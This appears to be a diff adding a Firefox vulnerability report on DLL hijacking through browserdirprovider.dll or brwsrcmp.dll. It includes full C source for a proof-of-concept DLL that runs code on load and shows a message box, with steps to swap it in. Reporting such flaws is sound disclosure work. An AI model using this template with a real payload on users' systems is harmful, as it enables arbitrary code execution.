@@ -1,0 +1,40 @@
+browserdirprovider.dll and brwsrcmp.dll is prone to DLL hijacking vulnerability
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
+Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
+
+A malicious DLL could be used to replace either browserdirprovider.dll or brwsrcmp.dll to perform arbitrary code.
+
+Reproducible: Always
+
+Steps to Reproduce:
+complie the following code
+Compiler : VC++ 2010 express
+Release
+Runtime Library: Multi-threaded (/MT)
+===============================================================================
+#include<Windows.h>
+
+void init()
+{
+MessageBoxA(NULL, "owned by moigai", "injected!!", MB_OK);
+}
+
+BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+switch(ul_reason_for_call)
+{
+case DLL_PROCESS_ATTACH:
+init();
+break;
+case DLL_THREAD_ATTACH:
+case DLL_THREAD_DETACH:
+case DLL_PROCESS_DETACH:
+break;
+}
+return TRUE;
+}
+===============================================================================
+
+And then replace the previous mentioned two DLL (either will do), then start firefox.
+Actual Results:
+The message box coded will popup when starting firefox.
